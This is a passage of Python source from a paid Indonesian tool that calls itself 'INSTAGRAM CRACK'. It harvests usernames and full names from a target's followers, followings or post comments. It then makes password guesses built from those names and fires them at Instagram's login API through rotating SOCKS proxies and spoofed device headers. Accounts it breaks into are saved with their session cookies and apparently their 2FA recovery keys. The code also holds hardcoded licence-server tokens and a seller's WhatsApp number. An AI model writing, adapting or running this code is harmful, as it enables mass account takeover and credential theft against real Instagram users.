        urut.append(Panel(f'''{P2}[{H2}*{P2}]{N2} Lisensi {H2}{key}-**-**\n{P2}[{H2}*{P2}]{N2} Join {H2}{tanggal1} {bulan1} {tahun1}\n{P2}[{H2}*{P2}]{N2} Expired {H2}{tanggal} {bulan} {tahun}\n{P2}[{H2}*{P2}]{N2} IpAddres {H2}{self.g4}''',width=37,padding=(0,1),style="bold grey100"))
        Console().print(Columns(urut))
        tab = Table()
        tab.add_column(f'{B2}NO.', style=f'bold green', justify='center')
        tab.add_column(f'{B2}MENU', style=f'bold green', justify='center', width=43)
        tab.add_row(f'{O2}01.',f'{P2}CRACK DARI PENGIKUT')
        tab.add_row(f'{O2}02.',f'{P2} CRACK DARI MENGIKUTI')
        
        
        
        
        Console().print(tab, justify='center',style=f'bold green')
        self.input_menu(cokie, sisa)

    def input_menu(self, kueh, exp):
        x = console.input(f' {P2}Masukan pilihan [1/2] : ')
        if x == '1' or x == '01' or x == '2' or x == '02': # Sama Aja
             
             uname = console.input(f' {P2} Masukan username tanpa tanda (@) : ')
             for users in uname.split(','):
                 getid = self.get_id(users, kueh)
             meki = False if x == '2' or x == '02' else True
             self.dump_acc(kueh, getid, meki, '')
             if len(self.id) > 0:self.methode()
             else:prints(Panel(f'{O2}TARGET PRIVAT AJG',width=80,padding=(0,3),style="bold green")) ; time.sleep(3.3) ; self.Menu(exp)

        elif x == '3' or x == '03':
             
             link = console.input(f' {P2} Masukan link postingan : ')
             medi = self.get_mediaid(link, kueh)
             for uid in medi:
                 self.GetUserComment(kueh, uid, '')
             self.methode()
        
        elif x == '4' or x == '04':
             try:
                 file = open(f'data/user/login/CP.txt','r').read()
             except:
                 console.print(f' {P2}[{H2}!{P2}] Opshhh Terjadi Kesalahan..') ; time.sleep(3) ; res.exit()
             for res in file.splitlines():
                 try:
                     user,pswd = res.split('|')[0], res.split('|')[1]
                     formatusr = '%s<=>%s'%(user,pswd)
                     if formatusr not in self.id:self.id.append(formatusr)
                 except IndexError:continue
             prints(Panel(f'{P2}Terdapat {K2}{len(self.id)} {P2}akun {K2}chekpoint{P2}, apakah anda ingin crack ulang?',width=80,padding=(0,4),style="bold green")) ;
             time.sleep(2.1)
             ykh = console.input(f' {P2}[{H2}?{P2}] Apakah Anda Ingin Crack Ulang Hasil {K2}Chekpoint{P2}? [Y/t] : ')
             if ykh =='y' or ykh =='Y':
               self.methode()
             else:time.sleep(3) ; self.Menu(exp)
             
        elif x == '0' or x == '00':
            prints(Panel(f'{P2}Apakah anda yakin ingin keluar atau hapus data login anda?',width=80,padding=(0,5),style="bold grey100"))
            rok = console.input(f' {P2}[{H2}*{P2}] Ingin keluar tools? [Y/t] : ')
            if rok =='Y' or rok =='y':
              try:
                  os.system('rm -rf data/user/login/cokie.txt')
              except:pass
              prints(Panel(f'{P2}Berhasil menghapus data login akun anda terimakasih untuk semuanya',width=80,padding=(0,1),style="bold grey100")) ; time.sleep(3) ; sys.exit()
            else:self.Menu(exp)
        else:self.Menu(exp)
      
       

                                  
        
    def get_id(self, ccv, cokie, list=[]):
        try:
            rsd = requests.get(f'https://www.instagram.com/{ccv}/', cookies = {'cookie': cokie}).text
            uid = re.search('"user_id":"(\d+)"', str(rsd)).group(1)
            if uid not in list:list.append(uid)
            else:pass
        except:pass
        return(list)

    def get_mediaid(self, url, cokie):
        ahmasa = []
        for x in url.split(','):
            self.head.update({'cookie':cokie})
            req = requests.get(x, headers=self.head).text
            idm = re.search('"media_id":"(\d+)"',str(req)).group(1)
            if len(idm) == 0:pass
            else:ahmasa.append(idm)
        return ahmasa
   
    def GetUserComment(self, cookie, media_id, max_min):
        try:
            HEADERS = {
                 'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
                 'content-type': 'application/x-www-form-urlencoded',
                 'x-csrftoken': re.findall('csrftoken=(.*?);',cookie)[0],
                 'cookie': cookie
            }
            response = requests.get(f'https://www.instagram.com/api/v1/media/{media_id}/comments/?can_support_threading=true&permalink_enabled=false&min_id={max_min}', headers=HEADERS).json()
            for y in response['comments']:
                format = '%s<=>%s'%(y['user']['username'], y['user']['full_name'])
                if format not in self.id:
                   self.id.append(format)
                   console.print(f" {P2}[{H2}*{P2}] Berhasil mengumpulkan {H2}{len(self.id)}{P2} userId...",end='\r')
            if 'next_min_id' in str(response):
                self.GetUserComment(cookie, media_id, response['next_min_id'])
        except Exception as e:pass
           
    

    def dump_acc(self, cokie, users, type, max_id):
        xnxx = 'followers' if type is True else 'following'
        for user in users:
            try:
                self.param.update({'max_id':max_id})
                req = requests.get(f'https://api.instagram.com/api/v1/friendships/{user}/{xnxx}/', params=self.param,headers=self.head, cookies={'cookie':cokie}).json()
                for data in req['users']:
                    xnxz = '%s<=>%s'%(data['username'], data['full_name'])
                    console.print(f" {P2}[{H2}*{P2}] Berhasil mengumpulkan {H2}{len(self.id)}{P2} userId...",end='\r')
                    if xnxz not in self.id:self.id.append(xnxz)
                if 'next_max_id' in str(req):self.dump_acc(cokie, users, type, req['next_max_id'])
            
            except:pass
        return self.id
    

    def kumpul(self):
        try:
           urut = []
           urut.append(Panel(f"{P2}Total {H2}{len(self.id)} {P2}username",padding=(0,2)))
           Console(width=70,style="bold green").print(Columns(urut),justify="center")
        except:pass
    
    
    def methode(self):
        self.kumpul()
        tab = Table()
        tab.add_column(f'{P2}NO.', style=f'bold green', justify='center')
        tab.add_column(f'{P2}METHODE', style=f'bold green', justify='center', width=43)
        tab.add_row(f'{H2}01.',f'{P2} GAN MODE SAD ')
        Console().print(tab, justify='center',style=f'bold green')
        xyz = console.input(f' {P2} Masukan pilihan [1] : ')
        
        self.exec_malink(xyz)

    def exec_malink(self, methode_login):
        global prog, des
        urut = []
        bulan = ['Januari', 'Februari', 'Maret', 'April',  'Mei', 'Juni', 'Juli','Agustus', 'September', 'Oktober', 'November', 'Desember']
        apacb = datetime.now()
        kontl = '%s/%s/%s'%(bulan[apacb.month-1], apacb.day, apacb.year)
                    
        Console().print(Columns(urut))
        prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
        des = prog.add_task('', total=len(self.id))
        with prog:
           with executor(max_workers=25) as bol:
                for kontol in self.id:
                    username, nama = kontol.split('<=>')
                    password = Require().Password(nama)                           
                    if methode_login in ('1','01'):bol.submit(self.ExecLogin, username, password)
                    

           print('\n')
           xnxx = []
           xnxx.append(Panel(f'Total OK {H2}{self.ok}',width=23,padding=(0,1),style=f"bold red"))           
           xnxx.append(Panel(f'{P2}Total A2F {M2}{self.tw}',width=23,padding=(0,1),style=f"bold red"))
           Console().print(Columns(xnxx))
           os.system('rm -rf .proxi.txt')
           sys.exit(0)

    def friends_user(self, name):
        try:
            yxz = {'Host': 'www.instagram.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'none'}
            self.head.update(yxz)
            req = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={name}', headers=self.head).json()['data']['user']
            ikut,mengikut,posting = req['edge_followed_by']['count'],req['edge_follow']['count'],req['edge_owner_to_timeline_media']['count']
            return(ikut,mengikut,posting)
        except:
            return('null','null','null')        
    
    def Fafo(self, cokie):
        try:
            self.c = re.findall('csrftoken=(.*?);',str(cokie))
            self.x = {"Host": "www.instagram.com","content-length": "0","x-requested-with": "XMLHttpRequest","x-csrftoken": "tJdFh5wJTuFDQZvpadl2kTm0LGRSkH8w" if len(self.c) == 0 else self.c[0],"x-ig-app-id": "936619743392459","x-instagram-ajax": "1011212827","user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36","content-type": "application/x-www-form-urlencoded","accept": "*/*","x-asbd-id": "129477","cookie":cokie}
            self.r = requests.post('https://www.instagram.com/api/v1/web/fxcal/ig_sso_users/', headers = self.x).json()
            if 'fbAccount' in str(self.r):
               self.nama = self.r['fbAccount']['display_name']
               self.Reqz = requests.get('https://accountscenter.instagram.com/profiles/', cookies = {'cookie':cokie}).text
               self.User = re.search('{"__typename":"XFBFXFBAccountInfo","id":"(.*?)"}', str(self.Reqz)).group(1)
            else:
               self.nama = None
               self.User = None
        except:
            self.nama = 'Requests Error!'
            self.User = 'Requests Error!'
        self.aku = '%s|%s'%(self.User, self.nama)
        return(self.aku)                       
    
    def ExecLogin(self, user, passwd, remove_all=None, show_change_acc=None, followlu=None, file='data/user/login/'):
        uasu = []
        requ = Require()
        prox = requ.socks()
        byps = requests.Session()
        kont = random.randint
        uaig = requ.UserAgent()
        curl = byps.get('https://www.instagram.com/api/v1/web/data/shared_data/', headers={'User-Agent':uaig})
        vit = random.choice([f"{M2}√",f"{O2}√",f"{U2}√",f"{N2}√",f"{K2}√",f"{A2}√",f"{H2}√",f"{B2}√",f"{J2}√"])
        mek = random.choice([f"{M2}GAN",f"{K2}GAN",f"{H2}",f"{B2}GAN",f"{U2}GAN",f"{N2}GAN",f"{O2}GAN",f"{J2}GAN",f"{A2}GAN"])
        prog.update(des,description=f"\r{P2}({vit}{P2}) {mek} {P2}[ {H2}{self.lp}{P2}/{B2}{len(self.id)} {P2}] OK-:{H2}{self.ok} {P2}CP-:{K2}{self.cp}")
        prog.advance(des)
        while True:
            try:
                headers = {
                    'User-Agent': uaig,
                    'X-DEVICE-ID': '%s'%(str(uuid.uuid4())),
                    'X-CM-Bandwidth-KBPS': '-1.000',
                    'X-CM-Latency': '-1.000',
                    'X-IG-App-Locale': 'id_ID',
                    'X-IG-Device-Locale': 'id_ID',
                   'X-IG-Connection-Speed': f'{random.randint(98,999)}kbps',
                    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
                    'X-IG-Bandwidth-TotalBytes-B': '0',
                    'X-IG-Bandwidth-TotalTime-MS': '0',
                    'X-Bloks-Version-Id': '8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07',
                    'X-MID': '' if byps.cookies.get('mid') is None else byps.cookies.get('mid'),
                    'X-IG-WWW-Claim': '0',
                    'X-Bloks-Is-Layout-RTL': 'false',
                    'X-IG-Connection-Type': 'WIFI',
                    'X-IG-Capabilities': '36r/dw==',
                    'X-IG-App-ID': '1217981644879628',
                    'X-IG-Device-ID': '%s'%(str(uuid.uuid4())),
                    'X-IG-Android-ID': requ.DeviceId(),
                    'Accept-Language': 'id-ID',
                    'X-FB-HTTP-Engine': 'Liger',             
                    'Host': 'i.instagram.com',
                    'Accept-Encoding': 'gzip',
                    'Connection': 'close'
                }
                payload = {
                    'post': '1',
                    'country_codes': '[{"country_code":"1","source":["default"]}]',
                    'phone_id':requ.poid(),
                    'adid':requ.adid(user),
                    'guid':requ.guid(),
                    'device_id':requ.DeviceId(),
                    'google_tokens': '[]',
                    'login_attempt_count': '0',
                    'username':user,
                    'password':'gan',
                    'queryParams': '{}',
                    'optIntoOneTap': 'false'
                }
                cookies = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
                break
            except requests.exceptions.ConnectionError: time.sleep(5); self.ExecLogin(user, passwd, remove_all, show_change_acc, followlu, file='data/user/login/')
            except:pass
        for pswd in passwd:
            if pswd:
               try:
                   payload.update({'password':pswd})
                   headers.update({'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',})
                   data = json.dumps(payload)
                   xnxx = requ.Signature(data)
                   prok = {'http': 'socks5://' + random.choice(prox)}
                   resp = byps.post('https://i.instagram.com/api/v1/accounts/login/', cookies={'cookie':cookies}, data=xnxx, headers=headers, proxies=prok)
                   if 'logged_in_user' in str(resp.text):
                       self.ok +=1
                       cookie = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
                       followers, following, postingan = self.friends_user(user)
                       akunfb=self.Fafo(cookie)
                       if remove_all is not None:
                          try:
                              on_authen = requ.OnAuthenA2f(cookie)
                              pemulihan, secretkey, status = on_authen['kode-pemulihan'], on_authen['SecretKey'], on_authen['success-a2f']
                              aktif_ora  = f'Di Aktifkan' if status is not False else 'Tidak Aktif'
                              
                              
                              cetak(panel(f"[bold white][[bold green]√[bold white]] Username [bold white]: [bold blue]{user}\n[bold white][[bold green]√[bold white]] Password [bold white]: [bold blue]{dadi_ora}\n[bold white][[bold green]√[bold white]] Followers [bold white]: [bold blue]{followers}\n[bold white][[bold white]√[bold white]] Following [bold white]: [bold blue]{following}\n[bold white][[bold green]√[bold white]] A2F [bold white]: [bold green]{aktif_ora}\n[bold white][[bold green]√[bold white]] Kode A2F [bold white]: [bold red]{pemulihan}\n[bold white][[bold green]√[bold white]] facebook [bold white] [bold green]{akunfb}\n[bold white][[bold green]√[bold white]] Cookie [bold white]: [bold purple]{cookie} {headers['User-Agent']}",title=f"[bold white][ [bold green]GAN LIVE [bold white]]",style=f"bold red"))
                              save = f'{user}|{dadi_ora}|{email}|{curl}|{secretkey}|{pemulihan}|{cookie}\n'
                          except Exception as e:
                                 cetak(panel(f"[bold white][[bold green]√[bold white]] facebook [bold white] [bold green]{akunfb}\n[bold white][[bold green]√[bold white]] Username [bold white]: [bold green]{user}\n[bold white][[bold green]√[bold white]] Password [bold white]: [bold green]{pswd}\n[bold white][[bold green]√[bold white]] Cookie [bold white]: [bold green]{cookie}",title=f"[bold white][ [bold green]LIVE [bold white]]",style=f"bold red"))
                                 save = f'{user}|{pswd}|{cookie}\n'
                       else:
                            cetak(panel(f"[bold white][[bold grenn]√[bold white]] Username [bold white]: [bold blue]{user}\n[bold white][[bold green]√[bold white]] Password [bold white]: [bold blue]{pswd}\n[bold white][[bold green]√[bold white]] Followers [bold white]: [bold blue]{followers}\n[bold white][[bold green]√[bold white]] Following [bold white]: [bold blue]{following}\n[bold white][[bold green]√[bold white]] Postingan [bold white]: [bold blue]{postingan}\n[bold white][[bold green]√[bold white]] facebook [bold white] [bold cyan]{akunfb}\n[bold white][[bold green]√[bold white]] Cookie [bold white]¥ [bold green]{cookie} {uaig}",title=f"[bold white][ [bold green] GAN NIH BOS[bold white]]",style=f"bold green"))
                            save = f'{user}|{pswd}|{cookie}\n'
                       with open(file+'OK.txt','a',encoding='utf-8') as sv:
                          sv.write(save)
                          sv.close()
                       if followlu is True:
                          self.bot_follow(cookie)
                       break
                   elif 'two_factor_required' in str(resp.text):
                       if show_change_acc is True:
                          cetak(panel(f"[bold white][[bold green]√[bold white]] Username [bold white]: [bold green]{user}\n[bold white][[bold green]√[bold white]] Password [bold white]: [bold green]{pswd}\n[bold white][[bold green]√[bold white]] Followers [bold white]: [bold green]{followers}\n[bold white][[bold green]√[bold white]] Following [bold white]: [bold green]{following}\n[bold white][[bold green]√[bold white]] Postingan [bold white]: [bold green]{postingan}\n[bold white][[bold green]√[bold white]] Cookie [bold white]¥ [bold green]{cookie} {uaig}",title=f"[bold white][ [bold green]SUCCES [bold white]]",style=f"bold red"))
                       self.tw +=1
                       open(file+'2F.txt','a', encoding='utf-8').write(f'{user}|{pswd}\n')
                       break
                   elif 'https://i.instagram.com/challenge/' in str(resp.text):
                       if show_change_acc is True:
                          cetak(panel(f"[bold white][[bold green]√[bold white]] Username [bold white]: [bold green]{user}\n[bold white][[bold green]√[bold white]] Password [bold white]: [bold green]{pswd}\n[bold white][[bold green]√[bold white]] Followers [bold white]: [bold green]{followers}\n[bold white][[bold green]√[bold white]] Following [bold white]: [bold green]{following}\n[bold white][[bold green]√[bold white]] Postingan [bold white]: [bold green]{postingan}\n[bold white][[bold green]√[bold white]] Cookie [bold white]¥ [bold green]{cookie} {uaig}",title=f"[bold white][ [bold green]SUCCES [bold white]]",style=f"bold red"))
                       self.cp +=1
                       open(file+'CP.txt','a', encoding='utf-8').write(f'{user}|{pswd}\n')
                       break
               except requests.exceptions.ConnectionError: time.sleep(10); self.ExecLogin(user, passwd, remove_all, show_change_acc,file='data/user/login/')
        self.lp +=1

    

#----------------[ CLASS ASSET AND KEYS ]----------------#
class AssetAndKey:
    
    def __init__(self) -> None:
        self.dire = 'data/user/login'
        self.byps = Brute()
        self.data,self.user,self.login = ('data'), ('user'), ('login')
        self.CreateDir()
        self.CekKeys()

    def CreateDir(self):
        try:os.mkdir(self.data)
        except:pass
        try:os.mkdir(self.data +'/'+ self.user)
        except:pass
        try:os.mkdir(self.data +'/'+ self.user +'/'+ self.login)
        except:pass

    def Keys(self):
        self.byps.Clear()
        self.byps.Logos()
        self.g4 = requests.Session().get('http://ip-api.com/json').json()['query']
        self.g3 = requests.Session().get('http://ip-api.com/json').json()['country']
        urut = []
        urut.append(Panel(f"{H2}{self.g4}",title=f"IP",subtitle=f"{B2}{self.g3}",padding=(0,2)))
        Console(width=70,style="bold grey100").print(Columns(urut),justify="center")
        prints(Panel(f'{P2}Silahkan masukan lisensi atau apikey server PK-IG Tools, jika anda belum memiliki {K2}lisensi atau apikey server{P2} anda bisa ketik {H2}GET {P2}dan ketik {B2}INFO {P2}untuk melihat harga lisensi atau apikey',width=80,padding=(0,2),style="bold grey100"))
        auth = console.input(f' {P2}[{H2}*{P2}] Masukan Lisensi Atau Apikey : ')
        xnxx = auth.lower()
        if auth == "'Info'" or auth == 'INFO' or auth == 'info':
           tab = Table()
           tab.add_column(f'{H2}NO.', style=f'bold grey100', justify='center')
           tab.add_column(f'{P2}MENU', style=f'bold grey100', justify='center', width=43)
           tab.add_column(f'{H2}PRICE', style=f'bold grey100', justify='center')
           tab.add_row(f'{H2}01.',f'{P2}Durasi 1 Minggu',f'{H2}50.000')
           tab.add_row(f'{H2}02.',f'{P2}Durasi 1 Bulan',f'{H2}100.000')
           tab.add_row(f'{H2}03.',f'{P2}Open Source Script',f'{H2}250.000')
           Console().print(tab, justify='center',style=f'bold grey100')
           ykh = console.input(f' {P2}[{H2}*{P2}] Pilihan Lisensi : ')
           if ykh =='1' or ykh =='01':
             console.print(f' {P2}[{H2}!{P2}] Tunggu Sebentar Anda Akan Di Arahkan Ke WhatsApp Admin')
             os.system('xdg-open https://wa.me/+6285194511634?text=Bang%20beli%20lisensi%20PK-IG%2C%20durasi%201%20minggu%20dong') ; time.sleep(3.1) ; self.Keys()
           elif ykh =='2' or ykh =='02':
               console.print(f' {P2}[{H2}!{P2}] Tunggu Sebentar Anda Akan Di Arahkan Ke WhatsApp Admin')
               os.system('xdg-open https://wa.me/+6285194511634?text=Bang%20beli%20lisensi%20PK-IG%2C%20durasi%201%20bulan%20dong') ; time.sleep(3.1) ; self.Keys()
           elif ykh =='3' or ykh =='03':
              console.print(f' {P2}[{H2}!{P2}] Tunggu Sebentar Anda Akan Di Arahkan Ke WhatsApp Admin')
              os.system('xdg-open https://wa.me/+6285194511634?text=Bang%20beli%20open%20source%20PK-IG%20dong') ; time.sleep(3.1) ; self.Keys()
           else:self.keys()
        elif auth == 'get' or auth == "'Get'" or auth =="GET":
           console.print(f' {P2}[{H2}!{P2}] Tunggu Sebentar Anda Akan Di Arahkan Ke WhatsApp Admin')
           os.system('xdg-open https://wa.me/+6285194511634?text=*Assalamualaikum%20bang%20mau%20beli%20lisensi%20PK-IG%20tools%20dong*') ; time.sleep(3.1) ; self.Keys()
        else:
           if len(auth) <=5:exit()
           else:self.confirm(auth)

    def confirm(self, keys, token='WyI5NzIwMTk4MiIsIlM3Y2o1aVcvL1YzVnFkRzBDaUI2KzVHbUQ0aTY4RE9uVVhraEppKzQiXQ==', produc_id='27976'):
        import datetime
        skrg = datetime.datetime.now()
        hari = skrg.day
        buln = skrg.month
        thun = skrg.year
        try:
            link = requests.get("https://app.cryptolens.io/api/key/Activate?token={}&ProductId={}&Key={}".format(token,produc_id,keys)).json()
            expd = link["licenseKey"]["expires"][:10]
            tahun,bulan,tanggal = expd.split("-")
            date = "%s%s%s"%(int(tanggal),int(bulan),int(tahun))
            neww = "%s%s%s"%(hari,buln,thun)
            if (len(neww)) == 7:
               neww = "0%s%s%s"%(hari,buln,thun)
            else:
               neww = neww
            form = "%d%m%Y"
            tess = datetime.datetime.strptime(date,form)
            mekk = datetime.datetime.strptime(neww,form)
            xnxx = tess - mekk
            sisa = xnxx.days
            if sisa <1:
               os.system(f'rm -rf {self.dire}/key.txt')
               prints(Panel(f'''{P2}Opshhh lisensi yang kamu miliki sudah kedaluwarsa''',width=80,padding=(0,10),style=f"bold grey100")) ; time.sleep(3) ; sys.exit()
            else:
               self.byps.Clear()
               self.byps.Logos()
               prints(Panel(f'''{P2}Selamat lisensi yang anda masukan terdaftar ke server PK-IG''',width=80,padding=(0,6),style=f"bold grey100")) ; time.sleep(2.1)
               urut = []
               urut.append(Panel(f"{P2}Sisa {H2}{sisa} {P2}hari lagi",title=f"Time",padding=(0,3)))
               Console(width=70,style="bold grey100").print(Columns(urut),justify="center")
               time.sleep(3.5)
               open(self.dire+'/key.txt','w',encoding='utf-8').write(f'{keys}')
               open(self.dire+'/day.txt','w',encoding='utf-8').write(f'{sisa}')
               self.byps.Menu(sisa)
        except KeyError:
           os.system(f'rm -rf {self.dire}/key.txt')
           prints(Panel(f'''{M2}Opshhh Lisensi Yang Kamu Miliki Sudah Kedaluwarsa''',width=80,padding=(0,10),style=f"bold grey100")) ; time.sleep(3) ; sys.exit()
        except Exception as e:print(e)

    def CekKeys(self):
        if os.path.isfile(f'{self.dire}/key.txt') is True:
           keys = open(self.dire+'/key.txt','r').read()
           self.confirm(keys)
        else:
           self.Keys()

#----------------[ CLASS LISENSI & INIT SELF ]----------------#
from time import sleep
class Lisensi:
   
   def __init__(self):
       self.ses       = requests.Session()
       self.url        = 'https://app.cryptolens.io'
       self.token     = 'WyI5NzIwMTk4MiIsIlM3Y2o1aVcvL1YzVnFkRzBDaUI2KzVHbUQ0aTY4RE9uVVhraEppKzQiXQ=='
       self.bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04":
       "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09":
       "September", "10": "Oktober", "11": "November", "12": "Desember"}
       self.data,self.user,self.login = ('data'), ('user'), ('login')
       self.CreateDir()
       self.ProductId = '27976'
       self.byps = Brute()

#----------------[ ANIMASI ]----------------#
   def animasi(self):
       exec = [f"[ {M2}■{P2}□□□□□□□□□ ]",f"[ {K2}■■{P2}□□□□□□□□ ]", f"[ {H2}■■■{P2}□□□□□□□ ]", f"[ {J2}■■■■{P2}□□□□□□ ]", f"[ {N2}■■■■■{P2}□□□□□ ]", f"[ {B2}■■■■■■{P2}□□□□ ]", f"[ {O2}■■■■■■■{P2}□□□ ]", f"[ {A2}■■■■■■■■{P2}□□ ]", f"[ {H2}■■■■■■■■■{P2}□ ]", f"[ {U2}■■■■■■■■■■{P2} ]"]
       for bool in range(50):
           sleep(0.1)
           Console().print(f'\r  {P2}[{H2}+{P2}] Please Wait... ' + exec[bool % len(exec)] +'',end='\r')

   def CreateDir(self):
        try:os.mkdir(self.data)
        except:pass
        try:os.mkdir(self.data +'/'+ self.user)
        except:pass
        try:os.mkdir(self.data +'/'+ self.user +'/'+ self.login)
        except:pass

#----------------[ CLEAR TERMINAL ]----------------#
   def clearTerminal(self):
       if "linux" in sys.platform.lower():os.system("clear")
       elif "win" in sys.platform.lower():os.system("cls")

#----------------[ DELETE LISENSI ]----------------#
   def removeLisensi(self):
       try:os.system('rm -rf data/.LisensiLog.json')
       except:pass

#----------------[ WHATSAPP ADMIN ]----------------#
   def WhatsApp(self):
       prints(Panel(f'''{P2}[{H2}!{P2}] Tunggu Sebentar Anda Akan Di Arahkan Ke WhatsApp Admin''',width=80,padding=(0,1),style=f"bold grey100"))
       try:
           self.wa = os.system("xdg-open https://wa.me/+628519451634?text=Assalamualaikum%20bang%20beli%20lisensi%20PK-IG%20nya%20dong")
           return self.wa
       except:pass

#----------------[ LOGO ]----------------#
   def Logooo(self):
       prints(Panel(f'''             
888b     d888           .d8888b.           888               888    
8888b   d8888          d88P  Y88b          888               888    
88888b.d88888          888    888          888               888    
888Y88888P888 888d888  888         8888b.  88888b.  888  888 888888 
888 Y888P 888 888P"    888  88888     "88b 888 "88b 888  888 888    
888  Y8P  888 888      888    888 .d888888 888  888 888  888 888    
888   "   888 888  d8b Y88b  d88P 888  888 888 d88P Y88b 888 Y88b.  
888       888 888  Y8P  "Y8888P88 "Y888888 88888P"   "Y88888  "Y888 
                                                                    
                                                                    
                                                                    
                                \n     {O2}INSTAGRAM CRACK | @-XD_''',width=80,padding=(1,19),style="bold grey100"))

#----------------[ HALAMAN PASTE LISENSI ]----------------#
   def pasteLisen(self):
       self.clearTerminal() ; self.byps.Logos()
       prints(Panel(f'''{P2}[{H2}+{P2}] Silahkan Masukkan Lisensi Tools Yang Anda Miliki\n{P2}[{H2}+{P2}] Belum Mempunyai Lisensi? ketik {P2}( {H2}BELI{P2} ) Untuk Melihat Harga''',width=80,padding=(0,1),style=f"bold grey100"))
       set = Console().input(f'  {P2}[{H2}?{P2}] Masukan Lisensi Tools : ')
       if set =='' or set =='':
         prints(Panel(f'''{P2}[{M2}!{P2}] Opshhh Silahkan Masukan Lisensi Anda Dan Jangan Kosong''',width=80,padding=(0,1),style=f"bold grey100"))
         sleep(3) ; self.pasteLisen()
       elif set =='beli' or set =='Beli' or set =='BELI':self.Harga()
       try:
            search = self.ses.get(f'''{self.url}/api/key/Activate?token=WyI5NzIwMTk4MiIsIlM3Y2o1aVcvL1YzVnFkRzBDaUI2KzVHbUQ0aTY4RE9uVVhraEppKzQiXQ==&ProductId=27976&Key={set}&Sign=True''').json()['licenseKey']['key']
            open("data/.LisensiLog.json","w").write(set)
            prints(Panel(f'''{P2}[{H2}✓{P2}] Selamat Lisensi Yang Anda Masukan Terdaftar Ke Server PK-IG Kami''',width=80,padding=(0,1),style=f"bold grey100"))
            sleep(3) ; self.chekData() ; sys.exit()
       except KeyError as e:
            prints(Panel(f'''{P2}[{M2}!{P2}] Opshh Lisensi Yang Anda Masukan Tidak Terdaftar Di Server PK-IG Kami''',width=80,padding=(0,1),style=f"bold grey100"))
            sleep(3) ; sys.exit()
       except (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout) as e:
            prints(Panel(f'''{P2}[{M2}!{P2}] Opshh Koneksi Internet Kamu Hilang. Pastikan Terhubung Dengan INTERNET/WiFi''',width=80,padding=(0,1),style=f"bold grey100"))
            sleep(3) ; sys.exit()

#----------------[ HARGA LISENSI ]----------------#
   def Harga(self):
       prints(Panel(f'''{P2}[{H2}01{P2}]. Lisensi 1 Minggu 50.000 max Pemakaian 1 Device\n{P2}[{H2}02{P2}]. Lisensi 1 Bulan 100.000 Max Pemakaian 5 Device\n{P2}[{H2}03{P2}]. Permanen Open Source 250.000 Full Update''',width=80,padding=(0,1),style=f"bold grey100"))
       bool = Console().input(f'  {P2}[{H2}?{P2}] Masukan Pilihan : ')
       if bool =='' or bool =='':prints(Panel(f'''{P2}[{M2}!{P2}] Opshhhh Silahkan Masukan Pilihan Yang Tersedia Di Atas Ye Bro''',width=80,padding=(0,1),style=f"bold grey100")); sleep(3) ; self.pasteLisen()
       elif bool =='1' or bool =='01':self.WhatsApp() ; sleep(3) ; self.pasteLisen()
       elif bool =='2' or bool =='02':self.WhatsApp() ; sleep(3) ; self.pasteLisen()
       elif bool =='3' or bool =='03':self.WhatsApp() ; sleep(3) ; self.pasteLisen()
       else:prints(Panel(f'''{P2}[{M2}!{P2}] Opshhhh Silahkan Masukan Pilihan Yang Tersedia Di Atas Ye Bro''',width=80,padding=(0,1),style=f"bold grey100")); sleep(3) ; self.pasteLisen()

#----------------[ CHECK DATA LISENSI ]----------------#
   def chekData(self):
       self.clearTerminal() ; self.Logooo()
       urut = []
       try:
            b = self.ses.get(f"{self.url}/api/key/Activate?token=WyI5NzIwMTk4MiIsIlM3Y2o1aVcvL1YzVnFkRzBDaUI2KzVHbUQ0aTY4RE9uVVhraEppKzQiXQ==&ProductId=27976&Key={open('data/.LisensiLog.json','r').read()}").json()
            c        = b['licenseKey']
            key      = c['key'][0:11]
            tahun    = c['expires'][0:4]
            buln     = c['expires'][5:7]
            tanggal  = c['expires'][8:10]
            bulan    = self.bulan_ttl[buln]
            tahun1   = c['created'][0:4]
            buln1    = c['created'][5:7]
            tanggal1 = c['created'][8:10]
            bulan1   = self.bulan_ttl[buln1]
       except:
            key       = "None"
            tanggal   = "None"
            bulan     = "None"
            tahun     = "None"
            tanggal1  = "None"
            bulan1    = "None"
            tahun1    = "None"
       urut.append(Panel(f'''{K2}*{M2} Lisensi => {H2}{key}-****-****\n{K2}*{M2} Join    => {H2}{tanggal1} {bulan1} {tahun1}\n{K2}*{M2} Expired => {H2}{tanggal} {bulan} {tahun}''',padding=(0,1), style="bold grey100"))
       Console(width=70,style="bold grey100").print(Columns(urut),justify="center")
       sleep(3) ; prints(Panel(f'''{P2}[{H2}✓{P2}] Silahkan Jalankan Ulang Scriptnya Dengan Ketik {O2}python IG_prem.py''',width=80,padding=(0,1),style=f"bold grey100"))

#----------------[ CHECK LISENSI AKTIF & NONAKTIF ]----------------#
   def ChekingLisensi(self):
       try:
           research = open("data/.LisensiLog.json","r").read()
       except FileNotFoundError as e:
           self.removeLisensi() ; self.pasteLisen()
       try:
           research = self.ses.get(f'''{self.url}/api/key/Activate?token=WyI5NzIwMTk4MiIsIlM3Y2o1aVcvL1YzVnFkRzBDaUI2KzVHbUQ0aTY4RE9uVVhraEppKzQiXQ==&ProductId=27976&Key={research}''').json()['licenseKey']['key']
           sleep(3) ; Brute().Menu()
       except KeyError as e:
